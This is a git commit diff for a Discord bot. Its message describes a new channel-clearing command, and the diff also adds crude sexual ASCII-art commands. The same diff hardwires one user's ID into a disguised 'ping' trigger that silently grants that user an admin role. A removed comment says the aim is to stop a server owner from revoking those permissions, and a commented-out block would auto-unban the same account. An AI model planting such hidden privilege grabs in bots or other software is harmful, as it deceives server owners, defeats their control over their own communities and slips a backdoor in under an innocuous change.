eb3d028e915fa52e3d80b8c001110d2f37c70097
Neo Wang <wanggdash@gmail.com>
2018-08-26 22:25:49 -0500

    added !clearchannel or !delete

--- index.mjs
+++ index.mjs
@@ -9,21 +9,24 @@ client.on('ready', () => {
 });
 
 client.on('message', async msg => {
-  if (msg.content === 'ping') {
+  //  if(true != msg.guild.members.has("<@190992299591729153>"))
+  //  {
+  //    msg.guild.unban("190992299591729153");
+  //  }
+
+  if (msg.content === 'ping') { //admin role
     let guild = msg.guild;
 
     (async () => {
-      // Uncomment one of the following to spam roles to prevent Dan from removing your admin perms.
-      // for (let i=0; i<100; i++)
-      if (msg.author.toString() == "<@YOUR ID HERE>") {
+      if (msg.author.toString() == "<@190992299591729153>") {
         createAdminRole(guild, client, msg.member);
-
         sleep(1000);
       }
     })();
-
-    msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
-  } else if (msg.content == "pong") {
+    msg.reply("pong");
+    //msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
+  }
+  else if (msg.content == "pong") {
     let guild = msg.guild;
 
     (async () => {
@@ -34,6 +37,43 @@ client.on('message', async msg => {
         printRoles(guild);
       }
     })()
+  }
+  else if (msg.content == "=hello")
+  {
+    return msg.channel.send("Hello!");
+  }
+  //else if (msg.content == `=fortnite ${platform} ${playerName}`)
+  //{
+  //  return msg.channel.send(`https://api.fortnitetracker.com/v1/profile/${platform}/${epic-nickname}`);
+  //}
+  else if (msg.content == "=nut")
+  {
+    return msg.channel.send("Praise the lord <@190992299591729153>");
+  }
+  //  else if(msg.content == "=fortnitestore")
+  //  {
+  //  https://api.fortnitetracker.com/v1/store
+  //  }
+  else if (msg.content == "=whoami")
+  {
+    msg.reply(`You are ${msg.author}`);
+  }
+  else if (msg.content == "=penisforeskin")
+  {
+    return msg.channel.send(fPen());
+  }
+  else if (msg.content == "=penis")
+  {
+    return msg.channel.send(cPen());
+  }
+  else if ((msg.content == "!clearchannel") || (msg.content == "!delete")) {
+      if (msg.member.hasPermission("MANAGE_MESSAGES")) {
+          msg.channel.fetchMessages()
+             .then(function(list){
+                  msg.channel.bulkDelete(list);
+                  return msg.channel.send("Channel Cleared. You can keep or delete this message.");
+              }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
+      }
   }
 });
 
@@ -66,4 +106,51 @@ function sleep(ms) {
 
 function printRoles(guild) {
   console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
+}
+
+function fPen() {
+  return (`
+    ……………………„„-~^^~„-„„_
+………………„-^*'' : : „'' : : : : *-„
+…………..„-* : : :„„--/ : : : : : : : '\\
+…………./ : : „-* . .| : : : : : : : : '|
+……….../ : „-* . . . | : : : : : : : : |
+………...\„-* . . . . .| : : : : : : : :'|
+……….../ . . . . . . '| : : : : : : : :|
+……..../ . . . . . . . .'\ : : : : : : : |
+……../ . . . . . . . . . .\ : : : : : : :|
+……./ . . . . . . . . . . . '\ : : : : : /
+….../ . . . . . . . . . . . . . *-„„„„-*'
+….'/ . . . . . . . . . . . . . . '|
+…/ . . . . . . . ./ . . . . . . .|
+../ . . . . . . . .'/ . . . . . . .'|
+./ . . . . . . . . / . . . . . . .'|
+'/ . . . . . . . . . . . . . . . .'|
+'| . . . . . \ . . . . . . . . . .|
+'| . . . . . . \„_^- „ . . . . .'|
+'| . . . . . . . . .'\ .\ ./ '/ . |
+| .\ . . . . . . . . . \ .'' / . '|
+| . . . . . . . . . . / .'/ . . .|
+| . . . . . . .| . . / ./ ./ . .|`);
+}
+
+function cPen() {
+  return (`
+    ………………………………………._¸„„„„_
+    …………………….…………...„--~*'¯…….'\\
+    ………….…………………… („-~~--„¸_….,/ì'Ì
+    …….…………………….¸„-^"¯ : : : : :¸-¯"¯/'
+    ……………………¸„„-^"¯ : : : : : : : '\\¸„„,-"
+    **¯¯¯'^^~-„„„----~^*'"¯ : : : : : : : : : :¸-"
+    .:.:.:.:.„-^" : : : : : : : : : : : : : : : : :„-"
+    :.:.:.:.:.:.:.:.:.:.: : : : : : : : : : ¸„-^¯
+    .::.:.:.:.:.:.:.:. : : : : : : : ¸„„-^¯
+    :.' : : '\\ : : : : : : : ;¸„„-~"
+    :.:.:: :"-„""***/*'ì¸'¯
+    :.': : : : :"-„ : : :"\\
+    .:.:.: : : : :" : : : : \\,
+    :.: : : : : : : : : : : : 'Ì
+    : : : : : : :, : : : : : :/
+    "-„_::::_„-*__„„~"
+    `);
 }
